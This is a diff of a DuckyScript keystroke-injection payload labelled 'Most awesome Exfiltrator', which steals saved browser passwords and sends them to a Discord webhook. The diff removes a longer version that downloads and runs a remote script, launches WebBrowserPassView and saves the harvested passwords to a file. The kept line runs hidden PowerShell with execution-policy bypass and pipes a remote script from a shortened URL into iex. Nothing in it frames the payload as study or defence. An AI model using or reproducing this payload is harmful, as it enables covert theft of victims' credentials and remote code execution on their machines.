@@ -11,32 +11,8 @@ REM Most awesome Exfiltrator !!
 REM
 REM Usage : Put your discord WEBHOOK and enjoy !
 REM
-REM !!!!!!!!!! NEED TO PUT YOUR WEBHOOK 2 TIMES !!!!!!!!!!
-REM
 DELAY 2000
 GUI r
 DELAY 1000
-STRING powershell
-ENTER
-DELAY 1000
-REM edit your webhook here
-STRING $DiscordUrl = 'DISCORD_WEBHOOK'
-ENTER
-STRING iex ((New-Object System.Net.WebClient).DownloadString('https://shorturl.at/puKOT'))
-ENTER
-DELAY 6000
-STRING wbpv28821@
-ENTER
-STRING .\WebBrowserPassView.exe
-ENTER
-DELAY 6000
-CTRL A
-CTRL S
-DELAY 2000
-STRING c:\temp\w3b_br0ws3r_p4ssw0rds.txt
-ENTER
-DELAY 1000
-ALT F4
-DELAY 800
 STRING powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'DISCORD_WEBHOOK'; irm https://shorturl.at/fiZ38 | iex}"
 ENTER
